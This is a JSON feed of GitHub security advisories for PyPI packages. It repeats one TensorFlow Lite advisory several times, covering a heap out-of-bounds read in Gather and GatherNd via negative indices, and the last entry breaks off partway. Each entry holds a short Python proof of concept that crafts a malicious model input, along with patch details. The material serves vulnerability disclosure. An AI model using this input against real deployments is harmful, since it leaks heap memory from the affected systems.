{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-gpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-gpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-gpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-cpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-cpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37687\">https://nvd.nist.gov/vuln/detail/CVE-2021-37687</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-jwf9-w5xm-f437\">https://github.com/advisories/GHSA-jwf9-w5xm-f437</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437",
            "title": "[tensorflow-cpu] Heap OOB in TFLite's `Gather*` implementations",
            "date_modified": "2024-08-29T22:01:09.000Z",
            "date_published": "2021-08-25T14:40:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-jwf9-w5xm-f437"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>TFLite's <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather_nd.cc#L124\"><code>GatherNd</code> implementation</a> does not support negative indices but there are no checks for this situation.</p>\n<p>Hence, an attacker can read arbitrary data from the heap by carefully crafting a model with negative values in <code>indices</code>.</p>\n<p>Similar issue exists in <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/lite/kernels/gather.cc\"><code>Gather</code> implementation</a>.</p>\n<pre><code class=\"language-python\">import tensorflow as tf\nimport numpy as np\ntf.compat.v1.disable_v2_behavior()\n\nparams = tf.compat.v1.placeholder(name=\"params\", dtype=tf.int64, shape=(1,))\nindices = tf.compat.v1.placeholder(name=\"indices\", dtype=tf.int64, shape=())\n\nout = tf.gather(params, indices, name='out')\n\nwith tf.compat.v1.Session() as sess:\n   converter = tf.compat.v1.lite.TFLiteConverter.from_session(sess, [params, indices], [out])\n   tflite_model = converter.convert()\n\ninterpreter = tf.lite.Interpreter(model_content=tflite_model)\ninterpreter.allocate_tensors()\n\ninput_details = interpreter.get_input_details()\noutput_details = interpreter.get_output_details()\n\nparams_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))\nindices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())\ninterpreter.set_tensor(input_details[0]['index'], params_data)\ninterpreter.set_tensor(input_details[1]['index'], indices_data)\n\ninterpreter.invoke()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commits <a href=\"https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f\">bb6a0383ed553c286f87ca88c207f6774d5c4a8f</a> and <a href=\"https://github.com/tensorflow/tensorflow/commit/eb921122119a6b6e470ee98b89e65d721663179d\">eb921122119a6b6e470ee98b89e65d721663179d</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security  guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 